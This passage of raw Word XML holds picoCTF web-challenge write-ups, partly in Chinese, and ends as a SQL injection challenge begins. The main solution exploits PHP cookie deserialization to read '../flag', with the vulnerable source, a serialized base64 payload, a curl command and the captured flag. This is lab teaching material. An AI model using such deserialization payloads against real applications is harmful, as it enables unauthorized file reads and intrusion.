          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>，但都顯示</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> Not Found</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>，但這邊給了我們提示，可能存在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> phps </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>的檔案，它能讓我們直接看到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> php </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t xml:space="preserve"> source code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:eastAsia="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:cs="Microsoft YaHei" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD66E59"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現在回過頭來試試看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="OpenSymbol" w:hAnsi="Consolas"/>
          <w:color w:val="222222"/>
        </w:rPr>
        <w:t>index.phps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56543E86" w14:textId="77777777" w:rsidR="00F924A8" w:rsidRDefault="00000000" w:rsidP="00F924A8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId124" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="00F924A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FC4D50"/>
          </w:rPr>
          <w:t>view-source:http://mercury.picoctf.net:25395/index.phps</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35094D5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Solution:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E823A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 challenge gives us a link which opens a webpage allowing us to login with a username and password. Doing some standard recoinassaince we find this robots.txt file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AD520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282FC60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User-agent: *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCC05C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Disallow: /admin.phps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0789D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553F434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".phps" files are php source files and seeing as they might exist on this site we try to find the source of the index.php file at http://mercury.picoctf.net:8404/index.phps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7704327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```html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74710B29" w14:textId="46A18D6F" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="00794AA0" w:rsidP="00794AA0">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13D28412" wp14:editId="0E2163A5">
            <wp:extent cx="5936494" cy="1988992"/>
            <wp:effectExtent l="0" t="0" r="762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25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5936494" cy="1988992"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC6214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Nothing much of interest here except the "cookie.php" and "authentication.php" file where we can find the source for at http://mercury.picoctf.net:8404/cookie.phps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="722870CB"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at http://mercury.picoctf.net:8404/authentication.phps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51191A68" w14:textId="18E278A4" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="003F18E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lastRenderedPageBreak/>
        <w:pict w14:anchorId="1CDE57FE">
          <v:rect id="Ink 54" o:spid="_x0000_s1032" style="position:absolute;margin-left:32.05pt;margin-top:275pt;width:163.05pt;height:18.3pt;z-index:251661312;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" coordsize="5453,44" filled="f" strokecolor="#00f900" strokeweight="6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" text="t"/>
            <o:ink i="AHIdA6AEPAEQWM9UiuaXxU+PBvi60uGbIgMTSBREgPIDRawCRwFG2ARXCQAAAAUCC2QZGDIKgcf/&#10;/w+Ax///DzMKgcf//w+Ax///DwomCYdye2bOLN4X7jNYX253d8iFY7A4GLCMPAAKABEg8A2czjK8&#10;2AG=&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:pict w14:anchorId="25DDB9A9">
          <v:rect id="Ink 53" o:spid="_x0000_s1031" style="position:absolute;margin-left:12.25pt;margin-top:60.8pt;width:90.4pt;height:18.8pt;z-index:251660288;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" coordsize="2889,64" filled="f" strokecolor="#00f900" strokeweight="6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" text="t"/>
            <o:ink i="AGgdA64CPgEQWM9UiuaXxU+PBvi60uGbIgMTSBREgPIDRawCRwFG2ARXCQAAAAUCC2QZGDIKgcf/&#10;/w+Ax///DzMKgcf//w+Ax///DwocBod3h3Yp6NqumYYromDmwAoAESAwbnHCMrzYAb==&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="001F49D5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F3FCFB5" wp14:editId="27674980">
            <wp:extent cx="6332220" cy="426212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26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="4262120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B16F26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The vulnerability here lies in the access_log class </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FC87A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0ED11CB" w14:textId="19C6C9D1" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="003F18E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49749D63">
          <v:rect id="Ink 55" o:spid="_x0000_s1030" style="position:absolute;margin-left:-4.55pt;margin-top:-.05pt;width:433.15pt;height:21.4pt;z-index:251662336;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" coordorigin=",1" coordsize="14981,151" filled="f" strokecolor="#00f900" strokeweight="6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" text="t"/>
            <o:ink i="AJABHQOkC0YBEFjPVIrml8VPjwb4utLhmyIDE0gURIDyA0WsAkcBRtgEVwkAAAAFAgtkGRgyCoHH&#10;//8PgMf//w8zCoHH//8PgMf//w8KRBOHauhvSWczLceGIgHBS+AirwK3wbiGuI/kfGEcKH4Q8PCb&#10;GIaqwDAXU1CxtjBwktAy8tAx8PBACgARILC1odkyvNgB&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>as we can create an access_log object that will read "../flag", pass it to the deserialzer at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D089D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```php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3843CE1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$perm_res_encoded =  urlencode(base64_encode(serialize($perm_res)));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C457CC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0CFDE64"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then encode it with base64 and pass it into the login cookie to trigger the deserialization error in:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319379D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```php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B6334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if(isset($_COOKIE["login"])){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DAF70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try{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C438A2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$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4617FD5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$g = $perm-&gt;is_guest();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215FDB1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ab/>
      </w:r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>$a = $perm-&gt;is_admin();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7564AFF5"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2BF4975" w14:textId="70D8462F" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="003F18E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02C59456">
          <v:rect id="Ink 59" o:spid="_x0000_s1029" style="position:absolute;margin-left:-116.55pt;margin-top:10.5pt;width:5.7pt;height:11.4pt;z-index:251666432;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" coordsize="1,1" filled="f" strokecolor="#00f900" strokeweight="4mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" text="t"/>
            <o:ink i="AFwdAhImARBYz1SK5pfFT48G+LrS4ZsiAxNIFESA8gNFyAFHAUaQA1cJAAAABQILZBkYMgqBx///&#10;D4DH//8PMwqBx///D4DH//8PChEBAQABAAoAESBQKN8VM7zYAb==&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>catch(Error $e){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F71E64B" w14:textId="783AA7CC" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF" w:rsidRDefault="003F18E9"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6E20B7DE">
          <v:rect id="Ink 58" o:spid="_x0000_s1028" style="position:absolute;margin-left:-221.55pt;margin-top:31.6pt;width:5.7pt;height:11.4pt;z-index:251665408;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" coordsize="1,1" filled="f" strokecolor="#00f900" strokeweight="4mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" text="t"/>
            <o:ink i="AFwdAhImARBYz1SK5pfFT48G+LrS4ZsiAxNIFESA8gNFyAFHAUaQA1cJAAAABQILZBkYMgqBx///&#10;D4DH//8PMwqBx///D4DH//8PChEBAQABAAoAESAwo50QM7zYAb==&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:pict w14:anchorId="4F756698">
          <v:rect id="Ink 56" o:spid="_x0000_s1027" style="position:absolute;margin-left:63.25pt;margin-top:-4.25pt;width:190.3pt;height:24.25pt;z-index:251663360;visibility:visible;mso-wrap-style:square;mso-wrap-distance-left:9pt;mso-wrap-distance-top:0;mso-wrap-distance-right:9pt;mso-wrap-distance-bottom:0;mso-position-horizontal:absolute;mso-position-horizontal-relative:text;mso-position-vertical:absolute;mso-position-vertical-relative:text" coordsize="6414,256" filled="f" strokecolor="#00f900" strokeweight="6mm">
            <v:stroke opacity="21845f" endcap="square"/>
            <v:path shadowok="f" o:extrusionok="f" fillok="f" insetpenok="f"/>
            <o:lock v:ext="edit" rotation="t" text="t"/>
            <o:ink i="AJYBHQP6BFABEFjPVIrml8VPjwb4utLhmyIDE0gURIDyA0WsAkcBRtgEVwkAAAAFAgtkGRgyCoHH&#10;//8PgMf//w8zCoHH//8PgMf//w8KSheHWDiyuGN0qwZw+Wk+B5tnBbcBhxxty29w2mEORZy1kmky&#10;8Icj0XhMEiVywDDYBBKVO4NAohMYNIonD4KACgARIMDAJ/wyvNgB&#10;" annotation="t"/>
          </v:rect>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t>die("Deserialization error. ".$perm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9CAE7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8DD5E8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1F7F1D8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A9DAE3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pass us the flag. To do this with encode the string "O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}" in base64 and pass it into the login cookie with curl.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3282AD"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2CBEDE1" w14:textId="48D3FF3F" w:rsid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curl -v --cookie 'login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9' mercury.picoctf.net:</w:t>
      </w:r>
      <w:r w:rsidR="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>5428</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>/authentication.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04946A8F" w14:textId="07F3E556" w:rsidR="00D51F95"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47DC2226" w14:textId="42108CEA" w:rsidR="00D51F95"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0FFACD25" wp14:editId="58F565CF">
            <wp:extent cx="6332220" cy="22720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27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2272030"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AB2EA6" w14:textId="77777777" w:rsidR="00D51F95" w:rsidRPr="00ED2DAF"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036AA1F8" w14:textId="283E82D3"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Endnote: to find the string "O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}" that needed to be encoded I played around in an online php compiler </w:t>
      </w:r>
      <w:hyperlink r:id="rId128" w:history="1">
        <w:r w:rsidRPr="00C6541D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
            <w:kern w:val="0"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:lang w:val="en-CA" w:bidi="ar-SA"/>
          </w:rPr>
          <w:t xml:space="preserve">at </w:t>
        </w:r>
        <w:r w:rsidR="00C6541D" w:rsidRPr="00C6541D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
            <w:kern w:val="0"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:lang w:val="en-CA" w:bidi="ar-SA"/>
          </w:rPr>
          <w:t>php sandbox</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>with serialize and unserialize functions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25291AC4"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&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F4888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class access_log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2425724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lastRenderedPageBreak/>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9E47E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public $log_file;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C218A9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__construct($lf) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCDE65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$this-&gt;log_file = $lf;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F09A51E"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8C4CD8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__toString() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510E29E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$this-&gt;read_log();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27699B8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5E33D72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append_to_log($data) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D2A07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file_put_contents($this-&gt;log_file, $data, FILE_APPEND);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C626A7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4751E8E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read_log() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C61768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file_get_contents($this-&gt;log_file);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320C2BB9"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7F63186"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD6A8E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$perm = new access_log("../flag");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781BCF0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 (serialize($perm)); //O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430AA400" w14:textId="77777777" w:rsid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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> b</w:t>
      </w:r>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>ase64_encode(serialize($perm));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE3646A" w14:textId="5D95487C"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//TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD44930" w14:textId="77901AFC" w:rsidR="00ED2DAF"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?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670882B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Flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8B7CD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0E5D8076" w14:textId="77777777" w:rsidR="00C6541D"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picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3ABA60" w14:textId="3BCD37B3" w:rsidR="0076788A"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4ADEA864" w14:textId="5AEEE06A"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1924256A" w14:textId="72210760"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lastRenderedPageBreak/>
        <w:t>Sql injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699F2BAB"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Web Gauntlet 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5B3F67"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 | 170 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399C04B2"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Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316CF5EF"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AUTHOR: MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C23A06D"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DCE3DD4"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If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C26CBC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6763678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Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B86A923"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This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:61434/ Filter: http://mercury.picoctf.net:61434/filter.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7824E0BD" w14:textId="4D21B1D6" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:num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Try any random username and password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46917DFC" w14:textId="6B2B4DBD"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t>We get:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1481B371" w14:textId="0FDA6BDF"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SELECT username, password FROM users WHERE username='ad' AND password='pass'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4968F2C6" w14:textId="5A366893"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http://mercury.picoctf.net:61434/filter.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA53EA9" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="00A35726" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Filters: or and true false union like = &gt; &lt; ; -- /* */ admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8C20C2" w14:textId="77777777"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ECB9086" w14:textId="3E6F2F14" w:rsidR="00702A7D" w:rsidRPr="00A35726"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8A4BFF" w14:textId="737F0FC0" w:rsidR="009A269F" w:rsidRDefault="00311F0B"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6C8C34FB" wp14:editId="0169CD6E">
            <wp:extent cx="6332220" cy="294449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29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2944495"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="169BEB10" w14:textId="5FDD52C1" w:rsidR="009A269F" w:rsidRDefault="00702A7D" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
